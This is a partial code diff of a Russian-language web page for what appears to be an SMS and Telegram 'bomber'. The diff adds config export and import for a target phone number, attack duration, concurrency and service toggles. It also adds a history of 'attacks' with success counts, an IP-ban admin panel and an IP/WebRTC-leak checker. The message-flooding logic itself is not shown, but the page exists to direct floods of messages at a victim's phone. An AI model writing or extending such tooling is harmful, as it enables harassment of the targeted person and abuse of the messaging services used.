+    <label style="display:flex; align-items:center; gap:.3rem; font-size:.75rem; color:var(--muted); background:rgba(199,125,255,.06); padding:.3rem .6rem; border-radius:12px;">
+      <input type="checkbox" checked> ${svc.name}
+    </label>
+  `).join('');
+}
+
+// Экспорт/импорт
 document.getElementById('exportBtn').addEventListener('click', () => {
-  const config = { phone: document.getElementById('attackPhone').value, region: attackRegion, dur: document.getElementById('attackDur').value };
+  const config = {
+    phone: document.getElementById('attackPhone').value,
+    duration: document.getElementById('attackDuration').value,
+    concurrency: document.getElementById('concurrency').value,
+    region: document.querySelector('#regionChips .region-chip.active')?.dataset.r,
+    sms: document.getElementById('enableSms').checked,
+    tg: document.getElementById('enableTg').checked
+  };
   const blob = new Blob([JSON.stringify(config)], {type:'application/json'});
   const a = document.createElement('a');
   a.href = URL.createObjectURL(blob);
@@ -862,11 +781,17 @@ document.getElementById('importBtn').addEventListener('click', () => {
       try {
         const cfg = JSON.parse(reader.result);
         if (cfg.phone) document.getElementById('attackPhone').value = cfg.phone;
-        if (cfg.dur) document.getElementById('attackDur').value = cfg.dur;
+        if (cfg.duration) document.getElementById('attackDuration').value = cfg.duration;
+        if (cfg.concurrency) document.getElementById('concurrency').value = cfg.concurrency;
         if (cfg.region) {
           document.querySelectorAll('#regionChips .region-chip').forEach(c => c.classList.remove('active'));
           const target = document.querySelector(`#regionChips .region-chip[data-r="${cfg.region}"]`);
           if (target) target.classList.add('active');
+        }
+        if (cfg.hasOwnProperty('sms')) document.getElementById('enableSms').checked = cfg.sms;
+        if (cfg.hasOwnProperty('tg')) {
+          document.getElementById('enableTg').checked = cfg.tg;
+          document.getElementById('tgServiceList').style.display = cfg.tg ? 'flex' : 'none';
         }
       } catch(e) { alert('Ошибка импорта'); }
     };
@@ -887,6 +812,28 @@ document.querySelectorAll('#regionChips .region-chip').forEach(chip => {
   });
 });
 
+// ========== ИСТОРИЯ ==========
+function renderHistory() {
+  const hist = JSON.parse(localStorage.getItem('attack_hist') || '[]');
+  const container = document.getElementById('historyEntries');
+  if (!hist.length) {
+    container.innerHTML = '<div style="color:var(--muted)">Нет завершённых атак</div>';
+    return;
+  }
+  container.innerHTML = hist.map(h => `
+    <div class="history-item">
+      <div class="h-top"><span class="h-phone">${h.phone}</span><span class="h-region">${h.type}</span></div>
+      <div class="h-stats">
+        <span class="ok">✓${h.success}</span>
+        <span class="fail">✗${h.failed}</span>
+        <span>${h.total ? Math.round(h.success*100/h.total) : 0}%</span>
+      </div>
+      <div style="font-size:.7rem; margin-top:.2rem;">${h.date}</div>
+    </div>
+  `).join('');
+}
+renderHistory();
+
 // ========== АДМИН-ПАНЕЛЬ ==========
 function getCurrentIp() {
   return fetch('https://api.ipify.org?format=json')
@@ -894,15 +841,8 @@ function getCurrentIp() {
     .then(d => d.ip)
     .catch(() => 'неизвестно');
 }
-
-function getBannedIps() {
-  return JSON.parse(localStorage.getItem('banned_ips') || '[]');
-}
-
-function saveBannedIps(ips) {
-  localStorage.setItem('banned_ips', JSON.stringify(ips));
-}
-
+function getBannedIps() { return JSON.parse(localStorage.getItem('banned_ips') || '[]'); }
+function saveBannedIps(ips) { localStorage.setItem('banned_ips', JSON.stringify(ips)); }
 function updateAdminPanel() {
   const banList = document.getElementById('banList');
   const banned = getBannedIps();
@@ -910,14 +850,12 @@ function updateAdminPanel() {
   document.querySelectorAll('#banList span[data-ip]').forEach(btn => {
     btn.addEventListener('click', (e) => {
       const ip = e.currentTarget.dataset.ip;
-      const newBanned = getBannedIps().filter(i => i !== ip);
-      saveBannedIps(newBanned);
+      saveBannedIps(getBannedIps().filter(i => i !== ip));
       updateAdminPanel();
     });
   });
   getCurrentIp().then(ip => document.getElementById('adminCurrentIp').textContent = ip);
 }
-
 document.getElementById('addBanBtn').addEventListener('click', () => {
   const ip = document.getElementById('banIpInput').value.trim();
   if (!ip) return;
@@ -928,105 +866,73 @@ document.getElementById('addBanBtn').addEventListener('click', () => {
     updateAdminPanel();
   }
 });
-
 document.getElementById('clearBanBtn').addEventListener('click', () => {
   saveBannedIps([]);
   updateAdminPanel();
 });
 
-// Блокировка доступа при загрузке
+// Блокировка при загрузке
 (async function checkBan() {
   if (window.location.protocol === 'file:') return;
   try {
     const ip = await getCurrentIp();
-    const banned = getBannedIps();
-    if (banned.includes(ip)) {
+    if (getBannedIps().includes(ip)) {
       document.body.innerHTML = `<div style="display:flex; align-items:center; justify-content:center; height:100vh; font-family:var(--fb); color:var(--text); background:var(--bg);"><div style="text-align:center; padding:2rem; background:var(--card); border-radius:var(--radius); border:1px solid var(--border);"><h1 style="color:var(--accent);">🚫 Доступ запрещён</h1><p>Ваш IP (${ip}) заблокирован администратором.</p></div></div>`;
     }
   } catch(e) {}
 })();
 
-// ========== IP CHECK (бесплатные API) ==========
-const IP_APIS = [
-  { url: 'http://ip-api.com/json', transform: d => ({ ip: d.query, country: d.country, city: d.city, isp: d.isp, org: d.org, as: d.as, proxy: d.proxy, hosting: d.hosting, mobile: d.mobile }) },
-  { url: 'https://ipinfo.io/json', transform: d => ({ ip: d.ip, country: d.country, city: d.city, isp: d.org, as: d.org?.split(' ')[0], privacy: { vpn: d.privacy?.vpn, proxy: d.privacy?.proxy, tor: d.privacy?.tor, hosting: d.privacy?.hosting } }) },
-  { url: 'https://freeipapi.com/api/json', transform: d => ({ ip: d.ipAddress, country: d.countryName, city: d.cityName, isp: d.isp, org: d.isp }) }
-];
-
-async function fetchFromApi(apiObj) {
-  const resp = await fetch(apiObj.url);
-  if (!resp.ok) throw new Error('API error');
-  const data = await resp.json();
-  return apiObj.transform(data);
-}
-
+// ========== IP CHECK ==========
 async function runIpCheck() {
   const tbody = document.getElementById('ipTableBody');
   tbody.innerHTML = '<tr><td>Загрузка...</td><td>⏳</td></tr>';
-
-  let result = {};
-  for (const api of IP_APIS) {
-    try {
-      result = await fetchFromApi(api);
-      break;
-    } catch(e) { continue; }
+  try {
+    const resp = await fetch('https://ipapi.co/json/');
+    if (!resp.ok) throw new Error('API error');
+    const d = await resp.json();
+    const rows = [
+      ['IP-адрес', d.ip],
+      ['Страна', d.country_name],
+      ['Город', d.city],
+      ['Провайдер', d.org],
+      ['ASN', d.asn],
+      ['Прокси', d.proxy ? 'Да' : 'Нет'],
+      ['Хостинг', d.hosting ? 'Да' : 'Нет']
+    ];
+    let webrtcLeak = null;
+    if (window.RTCPeerConnection) {
+      try {
+        webrtcLeak = await new Promise((resolve) => {
+          const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+          pc.createDataChannel(''); pc.createOffer().then(offer => pc.setLocalDescription(offer));
+          pc.onicecandidate = (e) => {
+            if (e.candidate) {
+              const parts = e.candidate.candidate.split(' ');
+              const ip = parts[4];
+              if (ip && ip !== '0.0.0.0' && !ip.startsWith('192.168') && !ip.startsWith('10.') && !ip.startsWith('172.')) {
+                resolve(ip); pc.close();
+              }
+            } else { resolve(null); pc.close(); }
+          };
+          setTimeout(() => { resolve(null); pc.close(); }, 3000);
+        });
+      } catch(e) {}
+    }
+    rows.push(['WebRTC утечка', webrtcLeak ? `Да (${webrtcLeak})` : 'Нет']);
+    tbody.innerHTML = rows.map(([label, val]) => {
+      let cls = 'ok';
+      if (val === 'Да') cls = 'warn';
+      return `<tr><td>${label}</td><td class="${cls}">${val}</td></tr>`;
+    }).join('');
+  } catch(e) {
+    tbody.innerHTML = '<tr><td colspan="2" class="bad">Ошибка проверки</td></tr>';
   }
-
-  if (!result.ip) {
-    tbody.innerHTML = '<tr><td colspan="2" class="bad">Не удалось получить данные</td></tr>';
-    return;
-  }
-
-  const rows = [
-    ['IP-адрес', result.ip],
-    ['Страна', result.country || '—'],
-    ['Город', result.city || '—'],
-    ['Провайдер (ISP)', result.isp || '—'],
-    ['Организация', result.org || '—'],
-    ['ASN', result.as || '—'],
-    ['Прокси', result.proxy ? 'Да' : 'Нет'],
-    ['VPN', result.privacy?.vpn ? 'Да' : 'Нет'],
-    ['Tor', result.privacy?.tor ? 'Да' : 'Нет'],
-    ['Хостинг / дата-центр', result.hosting || result.privacy?.hosting ? 'Да' : 'Нет']
-  ];
-
-  // WebRTC leak
-  let webrtcLeak = null;
-  if (window.RTCPeerConnection) {
-    try {
-      webrtcLeak = await new Promise((resolve) => {
-        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-        pc.createDataChannel('');
-        pc.createOffer().then(offer => pc.setLocalDescription(offer));
-        pc.onicecandidate = (e) => {
-          if (e.candidate) {
-            const parts = e.candidate.candidate.split(' ');
-            const ip = parts[4];
-            if (ip && ip !== '0.0.0.0' && !ip.startsWith('192.168') && !ip.startsWith('10.') && !ip.startsWith('172.')) {
-              resolve(ip);
-              pc.close();
-            }
-          } else {
-            resolve(null);
-            pc.close();
-          }
-        };
-        setTimeout(() => { resolve(null); pc.close(); }, 3000);
-      });
-    } catch(e) {}
-  }
-  rows.push(['WebRTC утечка', webrtcLeak ? `Да (${webrtcLeak})` : 'Нет']);
-
-  tbody.innerHTML = rows.map(([label, val]) => {
-    let cls = 'ok';
-    if (val === 'Да') cls = 'warn';
-    if (label.includes('Tor') && val === 'Да') cls = 'bad';
-    return `<tr><td>${label}</td><td class="${cls}">${val}</td></tr>`;
-  }).join('');
 }
-
 document.getElementById('refreshIpBtn').addEventListener('click', runIpCheck);
 if (document.getElementById('tab-ip').classList.contains('active')) runIpCheck();
+
+// ========== ЗАПУСК ==========
+loadServices();
 </script>
 </body>
 </html>
